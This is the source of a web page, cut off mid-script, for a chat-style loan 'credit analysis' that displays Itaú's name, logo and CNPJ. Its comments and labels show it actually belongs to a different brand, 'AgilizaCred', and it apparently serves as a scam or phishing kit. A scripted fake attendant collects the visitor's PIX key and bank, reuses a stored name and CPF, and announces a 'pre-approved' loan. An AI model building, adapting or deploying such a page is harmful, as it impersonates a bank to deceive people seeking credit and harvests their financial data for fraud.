<!DOCTYPE html><html lang="pt-BR"><head>
  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
    <script>
  window.pixelId = "69853718bc934f7cb27cf6c5";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>Análise de Crédito — Itaú</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700&family=Sora:wght@700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --green-accent: #22C55E;
      --green-accent-dark: #16A34A;
      --green-accent-light: #DCFCE7;
      --green-primary: #111827;
      --green-dark: #1F2937;
      --green-darker: #374151;
      --whatsapp-light: #dcf8c6;
      --bg: #e5ddd5;
      --text: #1f2937;
      --text-light: #6b7280;
      font-family: 'DM Sans', sans-serif;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    html { height: 100%; width: 100%; }
    
    body {
      height: 100%; width: 100%; background: #F4F5F7; color: var(--text);
      -webkit-font-smoothing: antialiased; display: flex; flex-direction: column;
      overflow: hidden; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    }

    header.header {
      background: #FFFFFF;
      padding: 14px 16px; width: 100%; z-index: 1000;
      box-shadow: 0 1px 0 #E5E7EB; flex-shrink: 0;
    }
    .header-content { display: flex; align-items: center; justify-content: space-between; gap: 16px; }
    .header-left { display: flex; align-items: center; gap: 14px; }
    .menu-icon {
      width: 40px; height: 40px; background: #F3F4F6;
      border-radius: 12px; display: flex; align-items: center; justify-content: center;
      cursor: pointer; transition: all 0.2s ease; border: 1px solid #E5E7EB;
    }
    .menu-icon:hover { background: #E5E7EB; transform: scale(1.05); }
    .menu-icon svg { width: 18px; height: 18px; color: #374151; stroke-width: 2.5; }

    .logo { display: flex; align-items: center; user-select: none; }
    .logo-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
    .logo-diamond { width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
    .logo-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#22C55E; letter-spacing:-0.5px; line-height:1; }

    /* ✅ NOVO: logo como imagem (header/rodapé/recibo) */
    .brand-logo{
      display:flex;
      align-items:center;
      user-select:none;
      text-decoration:none;
      line-height:0;
    }
    .brand-logo img{
      display:block;
      height: 26px; /* ajuste se quiser */
      width: auto;
      max-width: 190px;
      object-fit: contain;
    }
    .footer-logo-img img{
      height: 20px; /* ajuste se quiser */
      max-width: 180px;
      opacity: 0.95;
    }
    .receipt-logo-img img{
      height: 22px; /* ajuste se quiser */
      max-width: 200px;
      object-fit: contain;
      display:block;
      margin: 0 auto;
    }

    .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
    .user-name { font-size: 13px; font-weight: 600; color: #111827; max-width: 120px; }
    .user-cpf { font-size: 11px; color: #6B7280; letter-spacing: 0.3px; }
    .user-icon-wrapper {
      width: 40px; height: 40px; background: #DCFCE7;
      border-radius: 50%; display: flex; align-items: center; justify-content: center;
      border: 2px solid var(--green-accent); color: #16A34A;
    }
    .user-icon-wrapper svg { width: 20px; height: 20px; color: #16A34A; }
    .header-right { display: flex; align-items: center; gap: 10px; }

    .main-content {
      flex: 1; display: flex; align-items: center; justify-content: center;
      padding: 12px; overflow: hidden; min-height: 0;
    }

    .chat-container {
      background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      display: flex; flex-direction: column; width: 94%; max-width: 390px;
      height: 100%; max-height: min(680px, calc(100% - 20px)); overflow: hidden; position: relative;
    }

    .chat-header {
      background: #075E54;
      padding: 10px 16px; display: flex; align-items: center; gap: 12px;
      flex-shrink: 0;
    }
    .chat-header-back {
      width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
      color: white; cursor: pointer;
    }
    .chat-header-back svg { width: 24px; height: 24px; }
    .attendant-avatar {
      width: 44px; height: 44px; border-radius: 50%;
      border: none; object-fit: cover;
    }
    .attendant-info { flex: 1; }
    .attendant-info h3 { font-size: 16px; font-weight: 600; color: white; margin: 0; }
    .attendant-info p { font-size: 13px; font-weight: 400; color: rgba(255,255,255,0.8); margin: 0; }

    .chat-messages {
      flex: 1; overflow-y: auto; overflow-x: hidden; padding: 14px;
      background: #e5ddd5 url("images/fundo.jpg") center/cover;
      display: flex; flex-direction: column; gap: 12px;
      -webkit-overflow-scrolling: touch; overscroll-behavior: contain;
    }
    .chat-messages::-webkit-scrollbar { width: 6px; }
    .chat-messages::-webkit-scrollbar-track { background: transparent; }
    .chat-messages::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.2); border-radius: 3px; }

    .message { display: flex; gap: 6px; animation: slideIn 0.3s ease; max-width: 85%; }
    @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .message.attendant { align-self: flex-start; }
    .message.user { align-self: flex-end; flex-direction: row-reverse; }
    .message-avatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; flex-shrink: 0; box-shadow: 0 2px 6px rgba(0,0,0,0.15); align-self: flex-end; }
    .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--green-accent); display: flex; align-items: center; justify-content: center; flex-shrink: 0; box-shadow: 0 2px 6px rgba(0,0,0,0.15); align-self: flex-end; }
    .user-avatar svg { width: 18px; height: 18px; color: white; }
    .message-bubble { 
      max-width: 100%; padding: 8px 12px; border-radius: 8px; position: relative;
      box-shadow: 0 1px 1px rgba(0,0,0,0.08);
    }
    .message.attendant .message-bubble { 
      background: white; 
      border-top-left-radius: 0;
    }
    .message.attendant .message-bubble::before {
      content: '';
      position: absolute;
      top: 0;
      left: -8px;
      width: 0;
      height: 0;
      border-top: 0px solid transparent;
      border-bottom: 10px solid transparent;
      border-right: 8px solid white;
    }
    .message.user .message-bubble { 
      background: #d9fdd3; 
      border-top-right-radius: 0;
    }
    .message.user .message-bubble::before {
      content: '';
      position: absolute;
      top: 0;
      right: -8px;
      width: 0;
      height: 0;
      border-top: 0px solid transparent;
      border-bottom: 10px solid transparent;
      border-left: 8px solid #d9fdd3;
    }
    .message-name { font-size: 13px; font-weight: 600; color: #1fa855; margin-bottom: 2px; }
    .message-text { font-size: 14.5px; line-height: 1.4; color: #111b21; }
    .message-time { font-size: 11px; color: #667781; margin-top: 3px; text-align: right; display: flex; align-items: center; justify-content: flex-end; gap: 4px; }
    .message.user .message-name { color: var(--green-accent-dark); }

    .typing-indicator { display: flex; gap: 5px; padding: 4px 0; align-items: center; }
    .typing-dot { width: 8px; height: 8px; background: #8696a0; border-radius: 50%; animation: typingBounce 1.4s infinite ease-in-out; }
    .typing-dot:nth-child(1) { animation-delay: 0s; }
    .typing-dot:nth-child(2) { animation-delay: 0.2s; }
    .typing-dot:nth-child(3) { animation-delay: 0.4s; }
    @keyframes typingBounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }

    .options-container { display: flex; flex-direction: column; gap: 8px; margin-top: 8px; padding: 0 8px; }
    .option-button {
      background: white; border: 1.5px solid var(--green-accent); color: #111b21;
      padding: 14px 20px; border-radius: 24px; font-size: 15px; font-weight: 500;
      cursor: pointer; transition: all 0.15s; font-family: 'DM Sans', sans-serif;
      text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.08);
      -webkit-tap-highlight-color: transparent;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      user-select: none;
    }
    .option-button:active { 
      background: var(--green-accent); 
      color: white; 
      transform: scale(0.97); 
    }

    .input-container {
      background: #f0f2f5; padding: 6px 10px; display: flex; align-items: center;
      gap: 8px; flex-shrink: 0;
    }
    .input-wrapper { flex: 1; position: relative; display: flex; align-items: center; }
    .chat-input {
      width: 100%; border: none; outline: none; font-size: 16px;
      font-family: 'DM Sans', sans-serif; padding: 12px 16px; background: white;
      border-radius: 24px; min-height: 48px; max-height: 48px;
    }
    .chat-input::placeholder { color: #8696a0; }
    .send-btn {
      width: 48px; height: 48px; background: var(--green-accent); border: none;
      border-radius: 50%; display: flex; align-items: center; justify-content: center;
      cursor: pointer; flex-shrink: 0; transition: all 0.15s;
    }
    .send-btn:active { background: var(--green-accent-dark); transform: scale(0.92); }
    .send-btn svg { width: 22px; height: 22px; color: white; }

    .autocomplete-list {
      position: absolute; bottom: 100%; left: 0; right: 0; background: white;
      border-radius: 12px; box-shadow: 0 -4px 12px rgba(0,0,0,0.15);
      max-height: 150px; overflow-y: auto; margin-bottom: 8px; z-index: 100; display: none;
    }
    .autocomplete-item { padding: 12px 16px; cursor: pointer; border-bottom: 1px solid #f0f2f5; font-size: 14px; }
    .autocomplete-item:active { background: var(--green-accent-light); }
    .autocomplete-item:last-child { border-bottom: none; }

    .loading-container {
      display: none; flex-direction: column; align-items: center; justify-content: center;
      padding: 40px 20px; gap: 20px; background: white; border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 94%; max-width: 390px;
      height: 100%; max-height: 680px;
    }
    .loading-spinner { width: 50px; height: 50px; border: 4px solid var(--green-accent-light); border-top: 4px solid var(--green-accent); border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { font-size: 16px; font-weight: 600; color: #111827; text-align: center; }

    .approval-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; padding: 20px; }
    .approval-content { background: white; border-radius: 20px; padding: 32px 24px; max-width: 380px; width: 100%; text-align: center; animation: modalUp 0.4s ease; max-height: 90vh; overflow-y: auto; }
    @keyframes modalUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
    .approval-icon { width: 80px; height: 80px; background: var(--green-accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 6px 20px rgba(122,185,45,.35); }
    .approval-icon svg { width: 40px; height: 40px; color: white; stroke-width: 3; }
    .approval-title { font-size: 24px; font-weight: 700; color: #111827; margin-bottom: 12px; }
    .approval-subtitle { font-size: 16px; color: var(--text-light); margin-bottom: 24px; }
    .approval-details { background: #FAFBFC; border: 1.5px solid #E5E7EB; border-radius: 12px; padding: 20px; margin-bottom: 24px; text-align: left; }
    .approval-detail { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #E5E7EB; }
    .approval-detail:last-child { border-bottom: none; }
    .detail-label { font-size: 13px; color: #6B7280; }
    .detail-value { font-size: 15px; font-weight: 600; color: #111827; }
    .btn-continue { width: 100%; padding: 16px; background: var(--green-accent); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: 'DM Sans', sans-serif; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 15px rgba(122,185,45,.3); }
    .btn-continue:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(122,185,45,.4); background: var(--green-accent-dark); }
    .btn-continue svg { width: 20px; height: 20px; }

    .confetti { position: fixed; width: 10px; height: 10px; animation: fall 3s linear; pointer-events: none; }
    @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }

    .installment-card { 
      background: #ffffff;
      border: 2px solid var(--green-accent); 
      border-radius: 16px; 
      padding: 16px 12px; 
      cursor: pointer; 
      transition: all 0.15s ease; 
      text-align: center;
      position: relative;
      overflow: hidden;
      -webkit-tap-highlight-color: transparent;
    }
    .installment-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: var(--green-accent);
    }
    .installment-card:active { 
      transform: scale(0.97);
      background: var(--green-accent-light);
      border-color: var(--green-accent-dark);
    }
    .installment-months { 
      font-size: 13px; 
      font-weight: 700; 
      color: white;
      background: var(--green-accent);
      padding: 4px 12px;
      border-radius: 20px;
      display: inline-block;
      margin-bottom: 10px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .installment-value { 
      font-size: 20px; 
      font-weight: 800; 
      color: #111827; 
      margin-bottom: 4px;
    }
    .installment-total { 
      font-size: 11px; 
      color: #667781;
      background: #f0f2f5;
      padding: 4px 8px;
      border-radius: 8px;
      display: inline-block;
    }
    .installments-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 8px; margin-top: 12px; }

    /* Slider de valor */
    .slider-container { padding: 8px; margin-top: 8px; }
    .slider-card {
      background: white;
      border-radius: 20px;
      padding: 24px 20px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      border: 2px solid var(--green-accent);
    }
    .slider-header {
      text-align: center;
      margin-bottom: 24px;
    }
    .slider-label {
      font-size: 14px;
      color: #667781;
      display: block;
      margin-bottom: 8px;
    }
    .slider-value-display {
      font-size: 36px;
      font-weight: 800;
      color: #111827;
      line-height: 1;
    }
    .slider-wrapper {
      position: relative;
      height: 48px;
      display: flex;
      align-items: center;
      margin-bottom: 8px;
    }
    .amount-slider {
      -webkit-appearance: none;
      appearance: none;
      width: 100%;
      height: 8px;
      background: #e5e7eb;
      border-radius: 10px;
      outline: none;
      cursor: pointer;
      position: relative;
      z-index: 2;
    }
    .slider-track-fill {
      position: absolute;
      left: 0;
      top: 50%;
      transform: translateY(-50%);
      height: 8px;
      background: var(--green-accent);
      border-radius: 10px;
      pointer-events: none;
      z-index: 1;
      width: 31%;
    }
    .amount-slider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 32px;
      height: 32px;
      background: white;
      border: 4px solid var(--green-accent);
      border-radius: 50%;
      cursor: grab;
      box-shadow: 0 2px 10px rgba(122,185,45,0.3);
      transition: transform 0.15s, box-shadow 0.15s;
    }
    .amount-slider::-webkit-slider-thumb:hover {
      transform: scale(1.1);
      box-shadow: 0 4px 15px rgba(122,185,45,0.4);
    }
    .amount-slider::-webkit-slider-thumb:active {
      cursor: grabbing;
      transform: scale(1.15);
    }
    .amount-slider::-moz-range-thumb {
      width: 32px;
      height: 32px;
      background: white;
      border: 4px solid var(--green-accent);
      border-radius: 50%;
      cursor: grab;
      box-shadow: 0 2px 10px rgba(122,185,45,0.3);
    }
    .slider-limits {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      color: #8696a0;
      margin-bottom: 20px;
    }
    .slider-confirm-btn {
      width: 100%;
      padding: 16px;
      background: var(--green-accent);
      color: white;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      font-family: 'DM Sans', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: all 0.25s;
      box-shadow: 0 4px 15px rgba(122,185,45,0.3);
    }
    .slider-confirm-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(122,185,45,0.4);
      background: var(--green-accent-dark);
    }
    .slider-confirm-btn:active {
      transform: translateY(0);
    }
    .slider-confirm-btn svg {
      width: 20px;
      height: 20px;
    }

    .pix-receipt { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); max-width: 350px; margin: 0 auto; }
    .receipt-header { text-align: center; padding-bottom: 20px; border-bottom: 2px dashed #e5e7eb; margin-bottom: 20px; }
    .receipt-logo { display: none; }
    .receipt-logo-text { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:18px; color:#111827; letter-spacing:-0.5px; display:inline-block; }
    .receipt-logo-diamond { width:6px; height:6px; background:#22C55E; transform:rotate(45deg); margin:0 6px; border-radius:1px; display:inline-block; vertical-align:middle; }
    .receipt-logo-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:18px; color:#22C55E; letter-spacing:-0.5px; display:inline-block; }
    .receipt-title { font-size: 18px; font-weight: 700; color: #111827; margin-bottom: 4px; }
    .receipt-status { display: inline-flex; align-items: center; gap: 6px; background: var(--green-accent-light); color: var(--green-primary); padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-top: 8px; }
    .receipt-status svg { width: 16px; height: 16px; color: var(--green-accent); }
    .receipt-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f3f4f6; }
    .receipt-row:last-child { border-bottom: none; }
    .receipt-label { font-size: 13px; color: var(--text-light); font-weight: 500; }
    .receipt-value { font-size: 13px; color: var(--text); font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
    .receipt-amount { background: #FAFBFC; border: 1.5px solid #E5E7EB; padding: 16px; border-radius: 12px; text-align: center; margin: 16px 0; }
    .receipt-amount-label { font-size: 12px; color: #6B7280; margin-bottom: 4px; }
    .receipt-amount-value { font-size: 28px; font-weight: 700; color: #111827; }
    .receipt-footer { text-align: center; padding-top: 16px; border-top: 2px dashed #e5e7eb; margin-top: 16px; font-size: 11px; color: var(--text-light); }

    footer.site-footer { background: #FFFFFF; color: #6B7280; padding: 20px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; z-index: 999; border-top: 1px solid #E5E7EB; }
    .footer-inner { max-width: 100%; width: 100%; display: flex; flex-direction: column; align-items: center; gap: 8px; }
    .footer-logo { display: flex; align-items: center; user-select: none; }
    .footer-logo .f-logo-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:15px; color:#6B7280; letter-spacing:-0.5px; }
    .footer-logo .f-logo-diamond { width:5px; height:5px; background:#6B7280; transform:rotate(45deg); margin:0 6px; border-radius:1px; display:inline-block; vertical-align:middle; }
    .footer-logo .f-logo-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:15px; color:#22C55E; letter-spacing:-0.5px; }
    footer small { font-size: 11px; opacity: 0.75; text-align: center; }
    footer small strong { color: #16A34A; }

    .input-container.hidden { display: none; }
    .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
    .logo-row { display:flex; align-items:center; }
    .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
    .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
  </style>
</head>
<body>
  <header class="header">
    <div class="header-content">
      <div class="header-left">
        <div class="menu-icon">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
          </svg>
        </div>

        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
        <a class="brand-logo" href="#" aria-label="Itaú / AgilizaCred">
          <img src="/images/itau2.png" alt="Itaú">
        </a>

        <!-- (se quiser manter a logo antiga também, descomente) -->
        <!--
        <div class="logo-wrap">
          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
          <span class="logo-tagline">Crédito Fácil</span>
        </div>
        -->
      </div>
      <div class="header-right">
        <div class="user-info">
          <span class="user-name" id="userName">Carregando...</span>
          <span class="user-cpf" id="userCpf">***.***.***-**</span>
        </div>
        <div class="user-icon-wrapper">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
        </div>
      </div>
    </div>
  </header>

  <div class="main-content">
    <div class="chat-container" id="chatContainer">
      <div class="chat-header">
        <div class="chat-header-back" onclick="history.back()">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
        </div>
        <img src="images/image.png" alt="Marcela Torres" class="attendant-avatar">
        <div class="attendant-info"><h3>Marcela Torres</h3><p><span style="display:inline-block;width:8px;height:8px;background:#25d366;border-radius:50%;margin-right:4px;vertical-align:middle;"></span>online</p></div>
      </div>
      <div class="chat-messages" id="chatMessages"></div>
      
      <div class="input-container hidden" id="inputContainer">
        <div class="input-wrapper">
          <input type="text" class="chat-input" id="chatInput" placeholder="Digite aqui..." autocomplete="off" enterkeyhint="send">
          <div class="autocomplete-list" id="autocompleteList"></div>
        </div>
        <button class="send-btn" id="sendBtn" type="button">
          <svg viewBox="0 0 24 24" width="22" height="22" fill="white"><path d="M1.101 21.757L23.8 12.028 1.101 2.3l.011 7.912 13.623 1.816-13.623 1.817-.011 7.912z"></path></svg>
        </button>
      </div>
    </div>
    
    <div class="loading-container" id="loadingContainer">
      <div class="loading-spinner"></div>
      <div class="loading-text">Analisando suas informações...<br><small>Aguarde um momento</small></div>
    </div>
  </div>

  <div class="approval-modal" id="approvalModal">
    <div class="approval-content">
      <div class="approval-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg></div>
      <h2 class="approval-title">Parabéns!</h2>
      <p class="approval-subtitle">Seu empréstimo foi <strong>PRÉ-APROVADO</strong></p>
      <div class="approval-details" id="approvalDetails"></div>
      <button class="btn-continue" onclick="goToNextPage()">
        Continuar para Finalização
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path></svg>
      </button>
    </div>
  </div>

  <footer class="site-footer">
    <div class="footer-inner">

      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú / AgilizaCred">
        <img src="/images/itau2.png" alt="Itaú">
      </a>

      <small><strong>Itaú Unibanco S.A</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
    </div>
  </footer>

  <script>
    let userName = 'Cliente';
    let currentQuestion = 0;
    let currentInputMode = null;
    
    const questions = [
      { text: 'Olá! Para finalizar sua análise, preciso fazer algumas perguntas rápidas. Qual o principal motivo do seu empréstimo?', options: ['Pagar dívidas', 'Investir no negócio', 'Reformar a casa', 'Emergência médica'] },
      { text: 'Perfeito! Você possui conta bancária ativa em seu nome?', options: ['Sim, em banco tradicional', 'Sim, em banco digital', 'Sim, em ambos', 'Vou abrir uma conta'] },
      { text: 'Ótimo! Agora preciso saber onde você quer receber o dinheiro. Qual tipo de chave PIX você prefere usar?', options: ['CPF/CNPJ', 'Celular', 'E-mail', 'Chave Aleatória'], type: 'pix' },
      { text: 'Última pergunta! Quando pretende começar a pagar as parcelas?', options: ['No próximo mês', 'Em 30 dias', 'Em 60 dias', 'Em 90 dias'] }
    ];

    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Safra', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'BMG', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];

    let selectedPixType = '', pixKey = '', bankName = '', selectedLoanAmount = 0, selectedInstallments = 0, selectedMonthlyPayment = 0;

    const chatMessages = document.getElementById('chatMessages');
    const inputContainer = document.getElementById('inputContainer');
    const chatInput = document.getElementById('chatInput');
    const sendBtn = document.getElementById('sendBtn');
    const autocompleteList = document.getElementById('autocompleteList');

    function scrollToBottom() { requestAnimationFrame(() => { chatMessages.scrollTop = chatMessages.scrollHeight; }); }

    function showInput(mode, placeholder) {
      currentInputMode = mode;
      chatInput.value = '';
      chatInput.placeholder = placeholder;
      inputContainer.classList.remove('hidden');
      autocompleteList.style.display = 'none';
      if (mode === 'amount') { chatInput.inputMode = 'numeric'; chatInput.maxLength = 6; }
      else if (mode === 'confirmation') { chatInput.inputMode = 'text'; chatInput.maxLength = 3; }
      else { chatInput.inputMode = 'text'; chatInput.maxLength = 100; }
      setTimeout(scrollToBottom, 100);
    }

    function hideInput() { currentInputMode = null; inputContainer.classList.add('hidden'); autocompleteList.style.display = 'none'; chatInput.blur(); }

    sendBtn.addEventListener('click', handleSend);
    chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); handleSend(); } });
    chatInput.addEventListener('input', (e) => {
      const value = e.target.value;
      if (currentInputMode === 'bank') {
        const search = value.toLowerCase().trim();
        if (search.length > 0) {
          const filtered = bancosData.filter(b => b.toLowerCase().includes(search));
          if (filtered.length > 0) {
            autocompleteList.innerHTML = filtered.map(b => `<div class="autocomplete-item" data-bank="${b}">${b}</div>`).join('');
            autocompleteList.style.display = 'block';
          } else { autocompleteList.style.display = 'none'; }
        } else { autocompleteList.style.display = 'none'; }
      } else if (currentInputMode === 'amount') {
        let num = value.replace(/\D/g, '');
        if (num.length > 5) num = num.substring(0, 5);
        const n = parseInt(num) || 0;
        e.target.value = n > 30000 ? '30000' : num;
      } else if (currentInputMode === 'confirmation') { e.target.value = value.toUpperCase(); }
    });

    autocompleteList.addEventListener('click', (e) => { if (e.target.classList.contains('autocomplete-item')) { chatInput.value = e.target.dataset.bank; autocompleteList.style.display = 'none'; } });

    function handleSend() {
      const value = chatInput.value.trim();
      if (!value) return;
      switch (currentInputMode) {
        case 'pix': sendPixKey(value); break;
        case 'bank': sendBank(value); break;
        case 'confirmation': sendConfirmation(value); break;
      }
    }

    function loadUserData() {
      const n = localStorage.getItem('nome');
      if (n) {
        const ns = n.trim().split(' ');
        userName = ns[0];
        const u = ns.length > 1 ? ns[ns.length - 1] : '';
        document.getElementById('userName').textContent = u ? `${ns[0]} ${u}` : ns[0];
        questions[0].text = `Olá ${userName}! Para finalizar sua análise, preciso fazer algumas perguntas rápidas. Qual o principal motivo do seu empréstimo?`;
      }
      const c = localStorage.getItem('cpf');
      if (c) {
        const cl = c.replace(/\D/g, '');
        if (cl.length === 11) { document.getElementById('userCpf').textContent = `${cl.substring(0, 3)}.***.***-${cl.substring(9, 11)}`; }
      }
    }

    function addMessage(text, isUser = false, showOptions = false) {
      const m = document.createElement('div');
      m.className = `message ${isUser ? 'user' : 'attendant'}`;
      if (isUser) {
        m.innerHTML = `<div class="user-avatar"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg></div><div class="message-bubble"><div class="message-name">${userName}</div><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
      } else {
        m.innerHTML = `<img src="https://i.postimg.cc/WzMX8pk4/image.png" class="message-avatar"><div class="message-bubble"><div class="message-text">${text}</div><div class="message-time">${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}</div></div>`;
      }
      chatMessages.appendChild(m);
      if (showOptions && questions[currentQuestion]) {
        const op = document.createElement('div');
        op.className = 'options-container';
        op.style.padding = '0 16px';
        questions[currentQuestion].options.forEach(opt => {
          const b = document.createElement('button');
          b.className = 'option-button';
          b.textContent = opt;
          b.onclick = () => handleOption(opt, op);
          op.appendChild(b);
        });
        chatMessages.appendChild(op);
      }
      setTimeout(scrollToBottom, 50);
    }

    function showTyping() {
      const t = document.createElement('div');
      t.className = 'message attendant';
      t.id = 'typing';
      t.innerHTML = `<img src="https://i.postimg.cc/WzMX8pk4/image.png" class="message-avatar"><div class="message-bubble"><div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div></div>`;
      chatMessages.appendChild(t);
      scrollToBottom();
    }

    function removeTyping() { const t = document.getElementById('typing'); if (t) t.remove(); }

    function handleOption(option, container) {
      container.querySelectorAll('.option-button').forEach(b => b.disabled = true);
      addMessage(option, true);
      setTimeout(() => {
        container.remove();
        if (questions[currentQuestion].type === 'pix') {
          selectedPixType = option;
          currentQuestion++;
          setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(`Perfeito! Agora digite sua chave ${option}:`); setTimeout(() => showInput('pix', `Digite sua chave ${option}...`), 300); }, 1000); }, 500);
        } else {
          currentQuestion++;
          if (currentQuestion < questions.length) { setTimeout(() => { showTyping(); setTimeout(() => { removeTyping(); addMessage(questions[currentQuestion].text, false, true); }, 1500); }, 800); }
          else { finishChat(); }
        }
      }, 500);
    }

    let tempPixKey = '';

    function sendPixKey(value) {
      tempPixKey = value;
      hideInput();
      addMessage(value, true);
      setTimeout(() => {
        showTyping();
        setTimeout(() => {
          removeTyping();
          addMessage(`Sua chave PIX é:<br><br><strong>${value}</strong><br><br>Está correta?`);
          showPixConfirmButtons();
        }, 1000);
      }, 500);
    }

    function showPixConfirmButtons() {
      const container = document.createElement('div');
      container.className = 'options-container';
      container.id = 'pixConfirmContainer';
      container.style.padding = '0 16px';
      
      const btnSim = document.createElement('button');
      btnSim.className = 'option-button';
      btnSim.textContent = 'Sim, está correta';
      btnSim.style.background = 'var(--green-accent)';
      btnSim.style.color = 'white';
      btnSim.onclick = () => confirmPixKey(true, container);
      
      const btnNao = document.createElement('button');
      btnNao.className = 'option-button';
